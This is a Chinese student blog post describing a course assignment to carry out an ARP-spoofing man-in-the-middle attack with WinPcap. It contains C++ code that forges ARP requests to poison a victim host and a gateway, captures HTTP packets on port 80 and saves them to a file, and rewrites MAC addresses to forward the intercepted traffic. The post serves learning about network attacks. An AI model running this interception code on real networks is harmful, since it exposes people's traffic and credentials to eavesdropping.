---
title: WinPcap编程——APR欺骗
tags: [VC++]
date: 2016-12-29 23:48
---
最近socket大作业布置了一道，实现arp欺骗的代码。。正好利用此机会学一学
<!-- more -->
<link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css">
<div class="markdown_views"><h1 id="一-实验要求">一 实验要求</h1>
<p><strong>利用WinPcap编程，实现基于ARP欺骗的中 间人攻击。</strong> <br>
1）利用WinPcap，分别向被欺骗主机和网关发送APR请求包， 达到同时欺骗目标主机和网关的目的； <br>
2）所有目标主机和网关之间的数据都会被我们劫持，过滤 两者之间的所有http交互数据包，并保存为文件。 （http包的过滤可用80端口来标识）</br></br></p>
<h1 id="二-实验原理">二 实验原理</h1>
<h2 id="1-选择网卡及过滤规则">1 选择网卡及过滤规则</h2>
<p>在这里特别注以下几点：</p>
<pre class="prettyprint"><code class=" hljs cs"><span class="hljs-number">1</span> . <span class="hljs-keyword">char</span> packet_filter[] = <span class="hljs-string">"not arp"</span>;<span class="hljs-comment">//选择过滤的协议</span>
<span class="hljs-number">2</span> . <span class="hljs-comment">/* 跳转到用户选择的网卡 */</span>
<span class="hljs-keyword">for</span> (d = alldevs, i = <span class="hljs-number">0</span>; i&lt; inum - <span class="hljs-number">1</span>; d = d-&gt;next, i++);

<span class="hljs-comment">/* 打开网卡 */</span>
adhandle = pcap_open_live(d-&gt;name,                 
<span class="hljs-number">65536</span>,                         
<span class="hljs-number">1</span>,                             
<span class="hljs-number">1</span>,                         <span class="hljs-comment">//这里读取时间不要设置的太长，否则会超时</span>
errbuf                         
);

</code></pre>
<h2 id="2-arp欺骗主机和网关">2 ARP欺骗主机和网关</h2>
<h4 id="利用winpcap分别向被欺骗主机和网关发送apr请求包">利用WinPcap，分别向被欺骗主机和网关发送APR请求包</h4>
<pre><code>创建子线程，在子线程中实现arp欺骗
</code></pre>
<pre class="prettyprint"><code class=" hljs cpp"><span class="hljs-comment">//欺骗目标主机</span>
    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> sendbuf[<span class="hljs-number">60</span>], sendbuf1[<span class="hljs-number">60</span>]; <span class="hljs-comment">//arp包结构大小，42个字节</span>
    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> dip, sip;
    dip = inet_addr(victim_ip);<span class="hljs-comment">//目标ip</span>
    sip = inet_addr(gateway_ip);<span class="hljs-comment">//网关ip</span>
    <span class="hljs-built_in">memset</span>(eh.DestMAC, <span class="hljs-number">0xff</span>, <span class="hljs-number">6</span>);
    <span class="hljs-built_in">memcpy</span>(eh.SourMAC, smac, <span class="hljs-number">6</span>);   <span class="hljs-comment">//以太网首部源MAC地址</span>
    <span class="hljs-built_in">memcpy</span>(ah.smac, smac, <span class="hljs-number">6</span>);   <span class="hljs-comment">//ARP字段源MAC地址</span>
    <span class="hljs-built_in">memset</span>(ah.dmac, <span class="hljs-number">0x00</span>, <span class="hljs-number">6</span>);
    <span class="hljs-built_in">memcpy</span>(ah.sip, (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span>*)&amp;sip, <span class="hljs-number">4</span>);   <span class="hljs-comment">//ARP字段源IP地址</span>
    <span class="hljs-built_in">memcpy</span>(ah.dip, (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span>*)&amp;dip, <span class="hljs-number">4</span>);   <span class="hljs-comment">//ARP字段目的IP地址</span>
    eh.EthType = htons(ETH_ARP);   <span class="hljs-comment">//htons：将主机的无符号短整形数转换成网络字节顺序</span>
    ah.hdType = htons(ARP_HARDWARE);
    ah.proType = htons(ETH_IP);
    ah.hdSize = <span class="hljs-number">6</span>;
    ah.proSize = <span class="hljs-number">4</span>;
    ah.op = htons(ARP_REQUEST);
    <span class="hljs-built_in">memset</span>(sendbuf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(sendbuf));   <span class="hljs-comment">//ARP清零</span>
    <span class="hljs-built_in">memcpy</span>(sendbuf, &amp;eh, <span class="hljs-keyword">sizeof</span>(eh));
    <span class="hljs-built_in">memcpy</span>(sendbuf + <span class="hljs-keyword">sizeof</span>(eh), &amp;ah, <span class="hljs-keyword">sizeof</span>(ah));</code></pre>
<pre class="prettyprint"><code class=" hljs cpp"><span class="hljs-comment">//欺骗网关</span>
    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> Gate_dip, Gate_sip;
    Gate_dip = inet_addr(gateway_ip);<span class="hljs-comment">//目标地址ip</span>
    Gate_sip = inet_addr(victim_ip);
    <span class="hljs-built_in">memset</span>(eh1.DestMAC, <span class="hljs-number">0xff</span>, <span class="hljs-number">6</span>);
    <span class="hljs-built_in">memcpy</span>(eh1.SourMAC, smac, <span class="hljs-number">6</span>);  <span class="hljs-comment">//以太网首部源MAC地址</span>
    <span class="hljs-built_in">memcpy</span>(ah1.smac, smac, <span class="hljs-number">6</span>);   <span class="hljs-comment">//ARP字段源MAC地址</span>
    <span class="hljs-built_in">memset</span>(ah1.dmac, <span class="hljs-number">0x00</span>, <span class="hljs-number">6</span>);
    <span class="hljs-built_in">memcpy</span>(ah1.sip, (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span>*)&amp;Gate_sip, <span class="hljs-number">4</span>);   <span class="hljs-comment">//ARP字段源IP地址</span>
    <span class="hljs-built_in">memcpy</span>(ah1.dip, (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span>*)&amp;Gate_dip, <span class="hljs-number">4</span>);   <span class="hljs-comment">//ARP字段目的IP地址</span>
    eh1.EthType = htons(ETH_ARP);   <span class="hljs-comment">//htons：将主机的无符号短整形数转换成网络字节顺序</span>
    ah1.hdType = htons(ARP_HARDWARE);
    ah1.proType = htons(ETH_IP);
    ah1.hdSize = <span class="hljs-number">6</span>;
    ah1.proSize = <span class="hljs-number">4</span>;
    ah1.op = htons(ARP_REQUEST);
    <span class="hljs-built_in">memset</span>(sendbuf1, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(sendbuf1));   <span class="hljs-comment">//ARP清零</span>
    <span class="hljs-built_in">memcpy</span>(sendbuf1, &amp;eh1, <span class="hljs-keyword">sizeof</span>(eh1));
    <span class="hljs-built_in">memcpy</span>(sendbuf1 + <span class="hljs-keyword">sizeof</span>(eh1), &amp;ah1, <span class="hljs-keyword">sizeof</span>(ah1));</code></pre>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20161229233736175?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></p>
<h2 id="3-截获http报文">3 截获HTTP报文</h2>
<p>识别HTTP包只在前面识别的基础上，通过协议头所定义的结构体识别是否为80端口。</p>
<pre class="prettyprint"><code class=" hljs objectivec"><span class="hljs-comment">//保存http数据包</span>
    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> <span class="hljs-keyword">int</span>* sourcePort = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> <span class="hljs-keyword">int</span> *)(pkt_data + <span class="hljs-number">32</span>);
    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> <span class="hljs-keyword">int</span>* destPort = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> <span class="hljs-keyword">int</span> *)(pkt_data + <span class="hljs-number">34</span>);
    FILE *fp;
    <span class="hljs-keyword">if</span> (*sourcePort == htons(<span class="hljs-number">80</span>) || *destPort == htons(<span class="hljs-number">80</span>))
    {
        fp = fopen(<span class="hljs-string">"http.http"</span>, <span class="hljs-string">"ab"</span>);
        <span class="hljs-keyword">if</span> ( fp == <span class="hljs-literal">NULL</span>)
        {
            cout &lt;&lt; <span class="hljs-string">"failed !!\n"</span>;
            <span class="hljs-keyword">return</span> ;
        }
        fwrite(pkt_data, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>), header-&gt;len, fp);
        fclose(fp);
    }
</code></pre>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20161229233859551?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></p>
<h2 id="4-转发数据包">4 转发数据包</h2>
<p>通过识别mac地址，实现数据包的识别，继而修改数据包内容将其发送出去，具体实现如下 <br>
受害者向外发送数据</br></p>
<pre class="prettyprint"><code class=" hljs perl"><span class="hljs-keyword">if</span> (!memcmp(pkt_data, smac, <span class="hljs-number">6</span>) &amp;&amp; !memcmp(pkt_data+<span class="hljs-number">6</span>, dmac, <span class="hljs-number">6</span>))//受害者发包
    {
        <span class="hljs-keyword">send</span> = (unsigned char <span class="hljs-variable">*)</span>pkt_data;
        memcpy(<span class="hljs-keyword">send</span>, Gate_dmac, <span class="hljs-number">6</span>);                         <span class="hljs-regexp">//</span>将目的MAC改为网关的MAC
        memcpy(<span class="hljs-keyword">send</span> + <span class="hljs-number">6</span>, smac, <span class="hljs-number">6</span>);                      <span class="hljs-regexp">//</span>将源MAC改为自己的MAC
        <span class="hljs-keyword">if</span> (pcap_sendpacket(adhandle, pkt_data, header-&gt;len) == <span class="hljs-number">0</span>)
            cout &lt;&lt; <span class="hljs-string">"post succeed"</span>;
        <span class="hljs-keyword">printf</span>(<span class="hljs-string">"<span class="hljs-variable">%d</span>.<span class="hljs-variable">%d</span>.<span class="hljs-variable">%d</span>.<span class="hljs-variable">%d</span> -&gt; <span class="hljs-variable">%d</span>.<span class="hljs-variable">%d</span>.<span class="hljs-variable">%d</span>.<span class="hljs-variable">%d</span>\n"</span>,
            ih-&gt;saddr.byte1,
            ih-&gt;saddr.byte2,
            ih-&gt;saddr.byte3,
            ih-&gt;saddr.byte4,
            ih-&gt;daddr.byte1,
            ih-&gt;daddr.byte2,
            ih-&gt;daddr.byte3,
            ih-&gt;daddr.byte4
        );
        <span class="hljs-keyword">printf</span>(<span class="hljs-string">"A:<span class="hljs-variable">%x</span>.<span class="hljs-variable">%x</span>.<span class="hljs-variable">%x</span>.<span class="hljs-variable">%x</span>.<span class="hljs-variable">%x</span>.<span class="hljs-variable">%x</span><span class="hljs-variable">**</span><span class="hljs-variable">*%</span>x.<span class="hljs-variable">%x</span>.<span class="hljs-variable">%x</span>.<span class="hljs-variable">%x</span>.<span class="hljs-variable">%x</span>.<span class="hljs-variable">%x</span>\n"</span>, pkt_data[<span class="hljs-number">0</span>], pkt_data[<span class="hljs-number">1</span>], pkt_data[<span class="hljs-number">2</span>], pkt_data[<span class="hljs-number">3</span>], pkt_data[<span class="hljs-number">4</span>], pkt_data[<span class="hljs-number">5</span>], pkt_data[<span class="hljs-number">6</span>], pkt_data[<span class="hljs-number">7</span>], pkt_data[<span class="hljs-number">8</span>], pkt_data[<span class="hljs-number">9</span>], pkt_data[<span class="hljs-number">10</span>], pkt_data[<span class="hljs-number">11</span>]);
    }</code></pre>
<p>受害者接受数据包</p>
<pre class="prettyprint"><code class=" hljs perl"><span class="hljs-keyword">if</span> (!memcmp(pkt_data, smac, <span class="hljs-number">6</span>) &amp;&amp; !memcmp(pkt_data + <span class="hljs-number">6</span>, Gate_dmac, <span class="hljs-number">6</span>))//受害者收包
    {
        <span class="hljs-keyword">send</span> = (unsigned char <span class="hljs-variable">*)</span>pkt_data;
        memcpy(<span class="hljs-keyword">send</span>, dmac, <span class="hljs-number">6</span>);
        memcpy(<span class="hljs-keyword">send</span> + <span class="hljs-number">6</span>, smac, <span class="hljs-number">6</span>);
        <span class="hljs-keyword">if</span> (pcap_sendpacket(adhandle, pkt_data, header-&gt;len) == <span class="hljs-number">0</span>)
            cout &lt;&lt; <span class="hljs-string">"post succeed"</span>;
        <span class="hljs-keyword">printf</span>(<span class="hljs-string">"<span class="hljs-variable">%d</span>.<span class="hljs-variable">%d</span>.<span class="hljs-variable">%d</span>.<span class="hljs-variable">%d</span> -&gt; <span class="hljs-variable">%d</span>.<span class="hljs-variable">%d</span>.<span class="hljs-variable">%d</span>.<span class="hljs-variable">%d</span>\n"</span>,
            ih-&gt;saddr.byte1,
            ih-&gt;saddr.byte2,
            ih-&gt;saddr.byte3,
            ih-&gt;saddr.byte4,
            ih-&gt;daddr.byte1,
            ih-&gt;daddr.byte2,
            ih-&gt;daddr.byte3,
            ih-&gt;daddr.byte4
        );
        <span class="hljs-keyword">printf</span>(<span class="hljs-string">"C:<span class="hljs-variable">%x</span>.<span class="hljs-variable">%x</span>.<span class="hljs-variable">%x</span>.<span class="hljs-variable">%x</span>.<span class="hljs-variable">%x</span>.<span class="hljs-variable">%x</span><span class="hljs-variable">**</span><span class="hljs-variable">*%</span>x.<span class="hljs-variable">%x</span>.<span class="hljs-variable">%x</span>.<span class="hljs-variable">%x</span>.<span class="hljs-variable">%x</span>.<span class="hljs-variable">%x</span>\n"</span>, pkt_data[<span class="hljs-number">0</span>], pkt_data[<span class="hljs-number">1</span>], pkt_data[<span class="hljs-number">2</span>], pkt_data[<span class="hljs-number">3</span>], pkt_data[<span class="hljs-number">4</span>], pkt_data[<span class="hljs-number">5</span>], pkt_data[<span class="hljs-number">6</span>], pkt_data[<span class="hljs-number">7</span>], pkt_data[<span class="hljs-number">8</span>], pkt_data[<span class="hljs-number">9</span>], pkt_data[<span class="hljs-number">10</span>], pkt_data[<span class="hljs-number">11</span>]);
    }</code></pre>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20161229234105336?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></p>
<h1 id="三-实验总结">三 实验总结</h1>
<p>实验总体不难，但我在做得时候并不顺利，在其中体会到了一个道理，吃一堑长一智吧，那就是一定要知道自己每行代码再干什么。 <br>
一开始直接找了现成的选择网卡的代码，但直到最后调通之前才知道，那个代码是错的，根本就没有获取到TCP包~~~~，改了之后就好了。。。 <br>
并且在测试中发现，如果开wireshark抓包软件，那么受害者的网速会急剧变差。代码见附件</br></br></p></div>